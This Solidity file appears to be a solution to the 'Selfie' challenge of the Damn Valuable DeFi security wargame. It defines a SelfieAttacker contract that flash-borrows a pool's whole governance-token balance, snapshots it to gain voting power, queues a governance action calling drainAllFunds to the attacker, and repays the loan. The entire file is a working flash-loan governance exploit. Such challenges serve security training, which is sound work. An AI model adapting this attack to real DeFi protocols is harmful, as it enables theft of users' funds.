pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function governance() external returns (ISimpleGovernance);

    function token() external returns (DamnValuableTokenSnapshot);

    function flashLoan(uint256 amount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttacker {
    ISelfiePool selfiePool;
    ISimpleGovernance governance;
    DamnValuableTokenSnapshot governanceToken;
    address attacker;
    uint256 public attackActionId;

    constructor(address _selfiePool) {
        selfiePool = ISelfiePool(_selfiePool);
        governance = selfiePool.governance();
        governanceToken = selfiePool.token();
        attacker = msg.sender;
    }

    function attack() external {
        uint256 balance = governanceToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(balance);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        attackActionId = governance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        DamnValuableTokenSnapshot(tokenAddress).transfer(
            address(selfiePool),
            amount
        );
    }
}
